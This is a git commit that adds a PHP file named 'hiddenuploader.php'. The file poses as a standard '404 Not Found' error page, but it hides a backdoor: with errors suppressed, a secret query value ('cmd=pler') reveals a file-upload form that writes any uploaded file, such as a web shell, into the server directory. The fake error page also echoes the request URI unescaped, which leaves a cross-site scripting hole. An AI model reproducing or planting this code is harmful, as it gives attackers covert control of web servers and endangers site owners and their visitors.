bfe36623347b296dbabb53ee48e321b4e5ad6146
mralok <mrchildren1336@gmail.com>
2024-09-28 18:44:48 +0700

    Add files via upload

---
+++ hiddenuploader.php
@@ -0,0 +1,9 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL <?php echo $_SERVER['REQUEST_URI'];
+ ?> was not found on this server.</p>
+</body></html>
+<?php error_reporting(0); if($_GET['cmd'] == 'pler'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
